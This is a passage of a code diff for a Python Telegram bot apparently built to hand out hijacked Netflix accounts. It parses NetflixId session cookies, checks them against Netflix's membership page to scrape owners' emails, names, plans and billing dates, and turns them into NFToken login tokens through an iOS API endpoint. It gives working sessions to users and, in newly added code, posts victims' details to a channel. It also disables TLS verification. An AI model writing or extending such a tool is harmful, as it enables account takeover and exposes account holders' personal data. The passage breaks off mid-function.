@@ -17,15 +17,18 @@ from dotenv import load_dotenv
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
 import traceback
-from functools import wraps
 
 import requests
 import urllib3
 
-# Suppress warnings
+# ============================================================
+# SUPPRESS WARNINGS
+# ============================================================
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Fix asyncio loop
+# ============================================================
+# FIX ASYNCIO
+# ============================================================
 try:
     asyncio.get_running_loop()
 except RuntimeError:
@@ -33,8 +36,9 @@ except RuntimeError:
 
 ssl._create_default_https_context = ssl._create_unverified_context
 
-# Try libsql
-HAS_LIBSQL = False
+# ============================================================
+# IMPORT LIBRARIES
+# ============================================================
 try:
     import libsql_experimental as libsql
     HAS_LIBSQL = True
@@ -43,7 +47,7 @@ except ImportError:
         import libsql
         HAS_LIBSQL = True
     except ImportError:
-        pass
+        HAS_LIBSQL = False
 
 from telegram import (
     Update, InlineKeyboardButton, InlineKeyboardMarkup,
@@ -63,6 +67,7 @@ load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL", "")
 TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN", "")
+REPORT_CHANNEL_ID = os.getenv("REPORT_CHANNEL_ID", "")  # NEW
 
 admin_ids_str = os.getenv("ADMIN_IDS", "")
 ADMIN_IDS = [int(aid.strip()) for aid in admin_ids_str.split(",") if aid.strip().isdigit()]
@@ -74,7 +79,7 @@ CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", 20))
 MAX_RETRIES = int(os.getenv("MAX_RETRIES", 3))
 
 # ============================================================
-# LOGGING - SILENT MODE (No errors in console)
+# LOGGING - SILENT
 # ============================================================
 logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -83,9 +88,9 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ============================================================
-# SAFE DATABASE CLASS - Auto Reconnect
+# DATABASE - TURSO FIRST
 # ============================================================
-class SafeDatabase:
+class Database:
     _instance = None
     _lock = threading.Lock()
     
@@ -100,26 +105,27 @@ class SafeDatabase:
     def _initialize(self):
         self.use_turso = HAS_LIBSQL and TURSO_DATABASE_URL and TURSO_DATABASE_URL.startswith("libsql://")
         self.conn = None
-        self._connect()
-        self._init_tables()
-    
-    def _connect(self):
-        try:
-            if self.use_turso and TURSO_DATABASE_URL:
+        
+        if self.use_turso:
+            try:
                 if TURSO_AUTH_TOKEN:
                     self.conn = libsql.connect(TURSO_DATABASE_URL, auth_token=TURSO_AUTH_TOKEN)
                 else:
                     self.conn = libsql.connect(TURSO_DATABASE_URL)
-            else:
-                self.conn = sqlite3.connect("bot.db", check_same_thread=False)
-        except Exception:
-            self.conn = sqlite3.connect("bot.db", check_same_thread=False)
-    
-    def _ensure_connection(self):
+                print(f"✅ Connected to Turso database (PERSISTENT)")
+                self._init_tables()
+                return
+            except Exception as e:
+                print(f"⚠️ Turso failed: {e}")
+                self.use_turso = False
+        
         try:
-            self.conn.execute("SELECT 1")
-        except Exception:
-            self._connect()
+            self.conn = sqlite3.connect("bot.db", check_same_thread=False)
+            print(f"✅ Connected to SQLite database (LOCAL)")
+            self._init_tables()
+        except Exception as e:
+            print(f"❌ Database error: {e}")
+            raise
     
     def _init_tables(self):
         cur = self.conn.cursor()
@@ -172,7 +178,8 @@ class SafeDatabase:
                 membership_status TEXT,
                 email_verified BOOLEAN DEFAULT 0,
                 profiles TEXT,
-                user_guid TEXT
+                user_guid TEXT,
+                working_confirmed BOOLEAN DEFAULT 0
             )
         ''')
         cur.execute('''
@@ -186,7 +193,8 @@ class SafeDatabase:
                 reported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 reviewed_at TIMESTAMP,
                 admin_note TEXT,
-                admin_id INTEGER
+                admin_id INTEGER,
+                channel_post_id INTEGER
             )
         ''')
         cur.execute('''
@@ -238,7 +246,6 @@ class SafeDatabase:
         self.conn.commit()
     
     def execute(self, query, params=None):
-        self._ensure_connection()
         cur = self.conn.cursor()
         if params:
             cur.execute(query, params)
@@ -247,45 +254,34 @@ class SafeDatabase:
         return cur
     
     def executemany(self, query, params_list):
-        self._ensure_connection()
         cur = self.conn.cursor()
         cur.executemany(query, params_list)
         return cur
     
     def commit(self):
-        self._ensure_connection()
         self.conn.commit()
     
     def close(self):
         self.conn.close()
 
-db = SafeDatabase()
+db = Database()
 
 # ============================================================
-# SAFE HELPERS - No None/Key Errors
+# SAFE HELPERS
 # ============================================================
 
-def safe_get(data: Any, key: str, default: Any = None) -> Any:
-    """Safely get value from dict or return default."""
-    if isinstance(data, dict):
-        return data.get(key, default)
-    return default
-
-def safe_str(value: Any, default: str = "Unknown") -> str:
-    """Safely convert to string."""
+def safe_str(value, default="Unknown"):
     if value is None:
         return default
     return str(value).strip() or default
 
-def safe_int(value: Any, default: int = 0) -> int:
-    """Safely convert to int."""
+def safe_int(value, default=0):
     try:
         return int(value)
     except (ValueError, TypeError):
         return default
 
-def safe_bool(value: Any) -> bool:
-    """Safely convert to bool."""
+def safe_bool(value):
     if isinstance(value, bool):
         return value
     if isinstance(value, (int, float)):
@@ -295,7 +291,7 @@ def safe_bool(value: Any) -> bool:
     return False
 
 # ============================================================
-# NFToken Generator - Safe with Retry
+# NFToken GENERATOR
 # ============================================================
 NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 NFTOKEN_QUERY_PARAMS = {
@@ -348,17 +344,14 @@ NFTOKEN_HEADERS = {
     "x-netflix.request.client.timezoneid": "Asia/Dhaka",
 }
 
-def generate_nftoken_safe(netflix_id: str, attempts: int = 3) -> Tuple[Optional[str], Optional[str]]:
-    """Safe NFToken generation with retry - NEVER crashes."""
+def generate_nftoken(netflix_id: str, attempts: int = 3):
     if not netflix_id:
         return None, None
-    
     for attempt in range(attempts):
         try:
             headers = dict(NFTOKEN_HEADERS)
             headers["Cookie"] = f"NetflixId={netflix_id}"
             headers["x-netflix.request.attempt"] = str(attempt + 1)
-            
             response = requests.get(
                 NFTOKEN_API_URL,
                 params=NFTOKEN_QUERY_PARAMS,
@@ -366,7 +359,6 @@ def generate_nftoken_safe(netflix_id: str, attempts: int = 3) -> Tuple[Optional[
                 timeout=30,
                 verify=False
             )
-            
             if response.status_code == 200:
                 data = response.json()
                 token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
@@ -374,20 +366,16 @@ def generate_nftoken_safe(netflix_id: str, attempts: int = 3) -> Tuple[Optional[
                 expires = token_data.get("expires")
                 if token:
                     return token, expires
-            
             time.sleep(0.5)
-            
         except Exception:
             time.sleep(0.5)
-    
     return None, None
 
 # ============================================================
-# DATABASE HELPERS - ALL SAFE
+# DATABASE HELPERS
 # ============================================================
 
-def get_user_safe(user_id: int) -> Dict:
-    """Safely get user, never returns None."""
+def get_user(user_id: int):
     try:
         cur = db.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
         row = cur.fetchone()
@@ -412,8 +400,7 @@ def get_user_safe(user_id: int) -> Dict:
         "pending_report_type": "",
     }
 
-def create_user_safe(user_id: int, username: str, first_name: str):
-    """Safely create user, ignore errors."""
+def create_user(user_id: int, username: str, first_name: str):
     try:
         is_admin = 1 if user_id in ADMIN_IDS else 0
         db.execute('''
@@ -424,8 +411,7 @@ def create_user_safe(user_id: int, username: str, first_name: str):
     except Exception:
         pass
 
-def get_available_accounts_safe() -> List[Dict]:
-    """Safely get accounts, never crashes."""
+def get_available_accounts():
     try:
         cur = db.execute('''
             SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
@@ -449,8 +435,7 @@ def get_available_accounts_safe() -> List[Dict]:
     except Exception:
         return []
 
-def get_total_accounts_safe() -> Dict:
-    """Safely get total accounts."""
+def get_total_accounts():
     try:
         cur = db.execute('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
         total = cur.fetchone()[0] or 0
@@ -460,13 +445,11 @@ def get_total_accounts_safe() -> Dict:
     except Exception:
         return {"total": 0, "plans": {}}
 
-def assign_account_safe(user_id: int) -> Optional[Dict]:
-    """Safely assign account to user."""
+def assign_account(user_id: int):
     try:
-        accounts = get_available_accounts_safe()
+        accounts = get_available_accounts()
         if not accounts:
             return None
-        
         account = accounts[0]
         db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE assigned_to = ?', (user_id,))
         cur = db.execute('''
@@ -474,7 +457,6 @@ def assign_account_safe(user_id: int) -> Optional[Dict]:
             SET assigned_to = ?, assigned_at = CURRENT_TIMESTAMP, status = 'assigned' 
             WHERE id = ? AND status = 'available'
         ''', (user_id, account["id"]))
-        
         if cur.rowcount > 0:
             db.execute('''
                 UPDATE users 
@@ -488,8 +470,7 @@ def assign_account_safe(user_id: int) -> Optional[Dict]:
     except Exception:
         return None
 
-def get_assigned_account_safe(user_id: int) -> Optional[Dict]:
-    """Safely get assigned account."""
+def get_assigned_account(user_id: int):
     try:
         cur = db.execute('''
             SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry,
@@ -511,20 +492,17 @@ def get_assigned_account_safe(user_id: int) -> Optional[Dict]:
         pass
     return None
 
-def release_account_safe(account_id: int):
-    """Safely release account."""
+def release_account(account_id: int):
     try:
         db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE id = ?', (account_id,))
         db.commit()
     except Exception:
         pass
 
-def can_get_account_safe(user_id: int) -> Tuple[bool, str]:
-    """Safely check if user can get account."""
-    user = get_user_safe(user_id)
+def can_get_account(user_id: int):
+    user = get_user(user_id)
     if safe_bool(user.get("is_banned")):
-        return False, "🚫 You are banned from using this bot."
-    
+        return False, "🚫 You are banned."
     last_time = user.get("last_account_time")
     if last_time:
         try:
@@ -533,16 +511,14 @@ def can_get_account_safe(user_id: int) -> Tuple[bool, str]:
             cooldown_seconds = WORKING_COOLDOWN_MINUTES * 60
             if diff.total_seconds() < cooldown_seconds:
                 remaining = int((cooldown_seconds - diff.total_seconds()) / 60) + 1
-                return False, f"⏳ Please wait {remaining} minute(s)."
+                return False, f"⏳ Wait {remaining} minute(s)."
         except Exception:
             pass
-    
     if safe_int(user.get("accounts_used")) >= MAX_ACCOUNTS_PER_USER:
-        return False, f"⚠️ Max {MAX_ACCOUNTS_PER_USER} accounts per user."
+        return False, f"⚠️ Max {MAX_ACCOUNTS_PER_USER} accounts."
     return True, ""
 
-def save_account_batch_safe(accounts: List[Dict]) -> int:
-    """Safely save accounts in batch."""
+def save_account_batch(accounts):
     if not accounts:
         return 0
     try:
@@ -574,218 +550,250 @@ def save_account_batch_safe(accounts: List[Dict]) -> int:
     except Exception:
         return 0
 
-# ============================================================
-# TELEGRAM BOT - SILENT ERROR HANDLING
-# ============================================================
-
-async def safe_send_message(chat_id: int, text: str, reply_markup=None, parse_mode=ParseMode.MARKDOWN, context=None):
-    """Safely send message, never crashes."""
+def log_stock(admin_id: int, file_name: str, total: int, valid: int):
     try:
-        if context and context.bot:
-            await context.bot.send_message(
-                chat_id=chat_id,
-                text=text,
-                reply_markup=reply_markup,
-                parse_mode=parse_mode
-            )
+        db.execute('INSERT INTO stock_logs (admin_id, file_name, total_found, valid_found) VALUES (?, ?, ?, ?)',
+                   (admin_id, file_name, total, valid))
+        db.commit()
     except Exception:
         pass
 
-def clean_channel_id(ch_id: str):
-    if not ch_id:
-        return None
-    ch_id = ch_id.strip()
-    if ch_id.startswith("-100") or ch_id.isdigit():
-        try:
-            return int(ch_id)
-        except:
-            return ch_id
-    if ch_id.startswith("@"):
-        return ch_id
-    if "t.me/" in ch_id:
-        username = ch_id.split("t.me/")[-1].strip("/")
-        if username and not username.startswith("+"):
-            return f"@{username}"
-    return None
-
-async def check_force_join_safe(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """Safely check force join."""
+def log_daily_stats(hits: int = 0, free: int = 0, bad: int = 0):
     try:
-        channels = get_channels_safe()
-        channels = [c for c in channels if c.get("is_active")]
-        if not channels:
-            return True
-        for channel in channels:
-            target_id = clean_channel_id(channel.get("channel_id", ""))
-            if not target_id:
-                continue
-            try:
-                member = await context.bot.get_chat_member(target_id, user_id)
-                if member.status in [ChatMember.LEFT, ChatMember.KICKED]:
-                    return False
-            except Exception:
-                continue
-    except Exception:
-        pass
-    return True
-
-def get_channels_safe() -> List[Dict]:
-    """Safely get channels."""
-    try:
-        cur = db.execute('SELECT id, channel_id, channel_name, invite_link, is_active FROM channels')
-        rows = cur.fetchall()
-        return [{"id": r[0], "channel_id": safe_str(r[1]), "channel_name": safe_str(r[2]), "invite_link": safe_str(r[3]), "is_active": safe_bool(r[4])} for r in rows]
-    except Exception:
-        return []
-
-# ============================================================
-# START - MAIN MENU
-# ============================================================
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        user = update.effective_user
-        user_id = user.id
-        
-        # Check pending report
-        user_data = get_user_safe(user_id)
-        if safe_bool(user_data.get("pending_report")):
-            pending_type = safe_str(user_data.get("pending_report_type"))
-            await safe_send_message(user_id, 
-                f"⚠️ **You have a pending report!**\n\n"
-                f"Please upload a screenshot proof for your **{pending_type.upper()}** report.\n\n"
-                f"📸 Send a screenshot image now.\n\n"
-                f"👨‍💻 **Developer:** @Senzo268",
-                context=context
-            )
-            return
-        
-        create_user_safe(user_id, safe_str(user.username), safe_str(user.first_name))
-        
-        if safe_bool(user_data.get("is_banned")):
-            await safe_send_message(user_id, "🚫 You are banned from using this bot.", context=context)
-            return
-        
-        joined = await check_force_join_safe(user_id, context)
-        if not joined:
-            channels = get_channels_safe()
-            channels = [c for c in channels if c.get("is_active")]
-            keyboard = []
-            for ch in channels:
-                keyboard.append([InlineKeyboardButton(f"📢 Join {safe_str(ch.get('channel_name'))}", url=safe_str(ch.get('invite_link')))])
-            keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_join")])
-            await safe_send_message(user_id,
-                "🚨 **Please join our channels first!**\n\nYou must join all channels below to use this bot:",
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                context=context
-            )
-            return
-        
-        stats = get_total_accounts_safe()
-        plan_display = ""
-        for plan, count in stats.get('plans', {}).items():
-            emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱", "FREE": "🆓"}.get(plan, "📦")
-            plan_display += f"│ {emoji} {plan}: **{count}**\n"
-        
-        if not plan_display:
-            plan_display = "│ No accounts available\n"
-        
-        assigned = get_assigned_account_safe(user_id)
-        
-        keyboard = [
-            [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
-        ]
-        if assigned:
-            keyboard.append([
-                InlineKeyboardButton("✅ Working", callback_data="working"),
-                InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
-            ])
-        keyboard.append([
-            InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
-            InlineKeyboardButton("📊 My Status", callback_data="my_status"),
-        ])
-        if safe_bool(user_data.get("is_admin")) or user_id in ADMIN_IDS:
-            keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
-        
-        text = f"""
-🌟 **WELCOME TO SENZO NETFLIX BOT** 🌟
-
-━━━━━━━━━━━━━━━━━━━━━
-👋 Hello **{safe_str(user.first_name)}**!
-━━━━━━━━━━━━━━━━━━━━━
-
-📊 **ACCOUNT STATUS**
-┌─────────────────────
-│ 📦 Total Available: **{safe_int(stats.get('total'))}**
-{plan_display}└─────────────────────
-
-⚙️ **YOUR STATS**
-┌─────────────────────
-│ ✅ Working Reports: **{safe_int(user_data.get('working_reports'))}**
-│ ❌ Not Working: **{safe_int(user_data.get('notworking_reports'))}**
-│ 📦 Accounts Used: **{safe_int(user_data.get('accounts_used'))}/{MAX_ACCOUNTS_PER_USER}**
-└─────────────────────
-
-⏳ Cooldown: **{WORKING_COOLDOWN_MINUTES} min**
-
-━━━━━━━━━━━━━━━━━━━━━
-🔽 **SELECT AN OPTION BELOW**
-"""
-        text += "\n\n👨‍💻 **Developer:** @Senzo268"
-        
-        await safe_send_message(user_id, text, reply_markup=InlineKeyboardMarkup(keyboard), context=context)
-        
-    except Exception:
-        pass
-
-# ============================================================
-# GET ACCOUNT
-# ============================================================
-
-async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        query = update.callback_query
-        await query.answer()
-        user_id = query.from_user.id
-        
-        user_data = get_user_safe(user_id)
-        if safe_bool(user_data.get("is_banned")):
-            await safe_send_message(user_id, "🚫 You are banned.", context=context)
-            return
-        
-        can_get, msg = can_get_account_safe(user_id)
-        if not can_get:
-            await safe_send_message(user_id, msg, context=context)
-            return
-        
-        joined = await check_force_join_safe(user_id, context)
-        if not joined:
-            await safe_send_message(user_id, "⚠️ Please join all required channels first! Use /start", context=context)
-            return
-        
-        account = assign_account_safe(user_id)
-        if not account:
-            await safe_send_message(user_id, "❌ No accounts available right now. Please try again later!", context=context)
-            return
-        
-        cookie_full = safe_str(account.get('cookies', 'No cookies available'))
-        if len(cookie_full) > 3900:
-            cookie_display = cookie_full[:3900] + "\n\n... (cookie truncated due to length)"
+        cur = db.execute('SELECT id FROM stats WHERE date = CURRENT_DATE')
+        row = cur.fetchone()
+        if row:
+            db.execute('''
+                UPDATE stats 
+                SET total_hits = total_hits + ?, total_free = total_free + ?, total_bad = total_bad + ?
+                WHERE date = CURRENT_DATE
+            ''', (hits, free, bad))
         else:
-            cookie_display = cookie_full
+            db.execute('''
+                INSERT INTO stats (date, total_hits, total_free, total_bad)
+                VALUES (CURRENT_DATE, ?, ?, ?)
+            ''', (hits, free, bad))
+        db.commit()
+    except Exception:
+        pass
+
+def update_report_channel_post(report_id: int, channel_post_id: int):
+    try:
+        db.execute('UPDATE reports SET channel_post_id = ? WHERE id = ?', (channel_post_id, report_id))
+        db.commit()
+    except Exception:
+        pass
+
+def confirm_account_working(account_id: int, report_id: int, admin_id: int):
+    try:
+        db.execute('UPDATE accounts SET is_working = 1, status = "available", working_confirmed = 1 WHERE id = ?', (account_id,))
+        db.execute('UPDATE reports SET status = "accepted", reviewed_at = CURRENT_TIMESTAMP, admin_id = ? WHERE id = ?', (admin_id, report_id))
+        db.commit()
+        return True
+    except Exception:
+        return False
+
+# ============================================================
+# COOKIE EXTRACTION & CHECKING
+# ============================================================
+
+def extract_cookie_pairs(content: str):
+    pairs = []
+    seen = set()
+    try:
+        data = json.loads(content)
+        if isinstance(data, dict):
+            if "cookies" in data and isinstance(data["cookies"], list):
+                for cookie in data["cookies"]:
+                    if cookie.get("name") == "NetflixId":
+                        nid = safe_str(cookie.get("value"))
+                        if nid and nid not in seen:
+                            sid = None
+                            for c in data["cookies"]:
+                                if c.get("name") == "SecureNetflixId":
+                                    sid = safe_str(c.get("value"))
+                                    break
+                            seen.add(nid)
+                            pairs.append((nid, sid))
+    except Exception:
+        pass
+    if not pairs:
+        netflix_pattern = re.compile(r'NetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
+        secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
+        netflix_matches = netflix_pattern.findall(content)
+        secure_matches = secure_pattern.findall(content)
+        for i, nid in enumerate(netflix_matches):
+            nid = nid.strip('"\'')
+            sid = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
+            if nid and nid not in seen:
+                seen.add(nid)
+                pairs.append((nid, sid))
+    return pairs
+
+def get_cookie_text(netflix_id: str, secure_id: Optional[str] = None) -> str:
+    lines = [".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t" + safe_str(netflix_id)]
+    if secure_id:
+        lines.append(".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t" + safe_str(secure_id))
+    return "\n".join(lines)
+
+def check_account(cookies_dict: Dict) -> Dict:
+    if not cookies_dict or "NetflixId" not in cookies_dict:
+        return {"valid": False, "error": "Missing NetflixId"}
+    try:
+        session = requests.Session()
+        for name, value in cookies_dict.items():
+            session.cookies.set(name, value, domain=".netflix.com")
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "identity",
+        }
+        for attempt in range(MAX_RETRIES):
+            try:
+                response = session.get(
+                    "https://www.netflix.com/account/membership",
+                    headers=headers,
+                    timeout=CHECK_TIMEOUT,
+                    verify=False,
+                    allow_redirects=True
+                )
+                if response.status_code != 200:
+                    if attempt < MAX_RETRIES - 1:
+                        time.sleep(0.5)
+                        continue
+                    return {"valid": False, "error": f"HTTP {response.status_code}"}
+                if "login" in response.url.lower() or "signin" in response.url.lower():
+                    return {"valid": False, "error": "Redirected to login"}
+                text = response.text
+                email = None
+                for pattern in [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']:
+                    match = re.search(pattern, text, re.IGNORECASE)
+                    if match:
+                        email = match.group(1).strip()
+                        break
+                if not email:
+                    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
+                    if match:
+                        email = match.group(1).strip()
+                name = None
+                for pattern in [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
+                    match = re.search(pattern, text, re.IGNORECASE)
+                    if match:
+                        name = match.group(1).strip()
+                        break
+                country = None
+                for pattern in [r'"countryOfSignup"\s*:\s*"([^"]+)"', r'"currentCountry"\s*:\s*"([^"]+)"']:
+                    match = re.search(pattern, text, re.IGNORECASE)
+                    if match:
+                        country = match.group(1).strip()
+                        break
+                plan = None
+                for pattern in [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']:
+                    match = re.search(pattern, text, re.IGNORECASE)
+                    if match:
+                        plan = match.group(1).strip()
+                        break
+                plan_key = "FREE"
+                plan_label = "Free"
+                if plan:
+                    plan_lower = plan.lower()
+                    if any(x in plan_lower for x in ["premium", "高級", "高级"]):
+                        plan_key, plan_label = "PREMIUM", "Premium"
+                    elif any(x in plan_lower for x in ["standard", "标准", "標準"]):
+                        plan_key, plan_label = "STANDARD", "Standard"
+                    elif any(x in plan_lower for x in ["basic", "basico", "基本"]):
+                        plan_key, plan_label = "BASIC", "Basic"
+                    elif any(x in plan_lower for x in ["mobile", "ponsel", "movil"]):
+                        plan_key, plan_label = "MOBILE", "Mobile"
+                streams = None
+                match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', text)
+                if match:
+                    streams = int(match.group(1))
+                price = None
+                for pattern in [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"']:
+                    match = re.search(pattern, text, re.IGNORECASE)
+                    if match:
+                        price = match.group(1).strip()
+                        break
+                billing = None
+                match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
+                if match:
+                    billing = match.group(1).strip()
+                membership_status = None
+                match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
+                if match:
+                    membership_status = match.group(1).strip()
+                profiles = []
+                for match in re.finditer(r'"profiles"[^}]*"name"\s*:\s*"([^"]+)"', text, re.IGNORECASE):
+                    if match.group(1) not in profiles:
+                        profiles.append(match.group(1))
+                profiles_str = ", ".join(profiles) if profiles else None
+                user_guid = None
+                for pattern in [r'"userGuid"\s*:\s*"([^"]+)"', r'"ownerGuid"\s*:\s*"([^"]+)"']:
+                    match = re.search(pattern, text, re.IGNORECASE)
+                    if match:
+                        user_guid = match.group(1).strip()
+                        break
+                is_subscribed = plan_key != "FREE" or (membership_status and "current_member" in membership_status.lower())
+                nftoken = None
+                nftoken_expiry = None
+                if cookies_dict.get("NetflixId"):
+                    nftoken, nftoken_expiry = generate_nftoken(cookies_dict.get("NetflixId"))
+                return {
+                    "valid": True,
+                    "subscribed": is_subscribed,
+                    "email": email,
+                    "name": name,
+                    "country": country,
+                    "plan": plan,
+                    "plan_key": plan_key,
+                    "plan_label": plan_label,
+                    "streams": streams,
+                    "price": price,
+                    "billing_date": billing,
+                    "membership_status": membership_status,
+                    "profiles": profiles_str,
+                    "user_guid": user_guid,
+                    "nftoken": nftoken,
+                    "nftoken_expiry": nftoken_expiry,
+                }
+            except Exception:
+                if attempt < MAX_RETRIES - 1:
+                    continue
+                return {"valid": False, "error": "Error"}
+        return {"valid": False, "error": "Max retries exceeded"}
+    except Exception:
+        return {"valid": False, "error": "Error"}
+
+# ============================================================
+# CHANNEL POST FUNCTION - NEW FEATURE
+# ============================================================
+
+async def send_working_to_channel(bot, report_id: int, user_id: int, account_id: int, screenshot_file_id: str):
+    """Send working account post to channel with beautiful formatting."""
+    
+    if not REPORT_CHANNEL_ID:
+        return None
+    
+    try:
+        user = get_user(user_id)
+        account = get_assigned_account(user_id)
         
+        if not account:
+            return None
+        
+        # Build beautiful post
         text = f"""
-🎉 **ACCOUNT ASSIGNED!**
+📱 **WORKING ACCOUNT FOUND!**
 
 ━━━━━━━━━━━━━━━━━━━━━
 📧 **Email:** `{safe_str(account.get('email'))}`
 👤 **Name:** {safe_str(account.get('account_name'))}
-📱 **Phone:** {safe_str(account.get('phone'), 'Not provided')}
 🌍 **Country:** {safe_str(account.get('country'))}
 📦 **Plan:** {safe_str(account.get('plan'))}
-🛡️ **Status:** {safe_str(account.get('membership_status'), 'Unknown')}
+🛡️ **Status:** {safe_str(account.get('membership_status'), 'Active')}
 📺 **Streams:** {safe_int(account.get('streams'))}
-🎞️ **Quality:** {safe_str(account.get('quality'))}
 💰 **Price:** {safe_str(account.get('price'), 'N/A')}
 🗓️ **Billing:** {safe_str(account.get('billing_date'))}
 👥 **Extra Member:** {'✅ Yes' if safe_bool(account.get('extra_member')) else '❌ No'}
@@ -793,16 +801,7 @@ async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
 🆔 **GUID:** `{safe_str(account.get('user_guid'))}`
 ━━━━━━━━━━━━━━━━━━━━━
 
-🍪 **Cookie:**
-`{cookie_display}`
-
-━━━━━━━━━━━━━━━━━━━━━
-
-📝 **INSTRUCTIONS:**
-1️⃣ Click a login link below
-2️⃣ Test the account
-3️⃣ **IMPORTANT:** After testing, click Working or Not Working
-   and upload a screenshot as proof
+🔑 **NFToken Login:**
 """
         
         keyboard = []
@@ -826,7 +825,349 @@ async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard.append([
                 InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
             ])
-            text += "\n\n💡 **Use the cookie above** with a cookie editor extension to login."
+        
+        text += f"""
+━━━━━━━━━━━━━━━━━━━━━
+✅ **Reported by:** @{safe_str(user.get('username'))}
+🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+━━━━━━━━━━━━━━━━━━━━━
+👨‍💻 **Developer:** @Senzo268
+
+⚠️ **This account is working!**
+"""
+        
+        # Add confirm button for admins
+        keyboard.append([
+            InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{report_id}_{account_id}")
+        ])
+        keyboard.append([
+            InlineKeyboardButton("❌ Mark Not Working", callback_data=f"confirm_notworking_{report_id}_{account_id}")
+        ])
+        
+        # Send photo + caption to channel
+        try:
+            sent_message = await bot.send_photo(
+                chat_id=REPORT_CHANNEL_ID,
+                photo=screenshot_file_id,
+                caption=text,
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode=ParseMode.MARKDOWN
+            )
+            
+            # Save channel post ID
+            update_report_channel_post(report_id, sent_message.message_id)
+            
+            return sent_message.message_id
+            
+        except Exception as e:
+            # If photo fails, send text only
+            try:
+                sent_message = await bot.send_message(
+                    chat_id=REPORT_CHANNEL_ID,
+                    text=f"📱 **WORKING ACCOUNT FOUND!**\n\n{text}",
+                    reply_markup=InlineKeyboardMarkup(keyboard),
+                    parse_mode=ParseMode.MARKDOWN
+                )
+                update_report_channel_post(report_id, sent_message.message_id)
+                return sent_message.message_id
+            except Exception:
+                return None
+                
+    except Exception:
+        return None
+
+async def send_notworking_to_channel(bot, report_id: int, user_id: int, account_id: int, screenshot_file_id: str):
+    """Send not working account post to channel."""
+    
+    if not REPORT_CHANNEL_ID:
+        return None
+    
+    try:
+        user = get_user(user_id)
+        account = get_assigned_account(user_id)
+        
+        if not account:
+            return None
+        
+        text = f"""
+❌ **NOT WORKING ACCOUNT REPORTED!**
+
+━━━━━━━━━━━━━━━━━━━━━
+📧 **Email:** `{safe_str(account.get('email'))}`
+👤 **Name:** {safe_str(account.get('account_name'))}
+🌍 **Country:** {safe_str(account.get('country'))}
+📦 **Plan:** {safe_str(account.get('plan'))}
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ **Reported by:** @{safe_str(user.get('username'))}
+🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+━━━━━━━━━━━━━━━━━━━━━
+👨‍💻 **Developer:** @Senzo268
+
+⛔ **This account is NOT working!**
+"""
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Accept Report", callback_data=f"confirm_notworking_accept_{report_id}_{account_id}")],
+            [InlineKeyboardButton("❌ Reject Report", callback_data=f"confirm_notworking_reject_{report_id}_{account_id}")]
+        ]
+        
+        try:
+            sent_message = await bot.send_photo(
+                chat_id=REPORT_CHANNEL_ID,
+                photo=screenshot_file_id,
+                caption=text,
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode=ParseMode.MARKDOWN
+            )
+            update_report_channel_post(report_id, sent_message.message_id)
+            return sent_message.message_id
+        except Exception:
+            try:
+                sent_message = await bot.send_message(
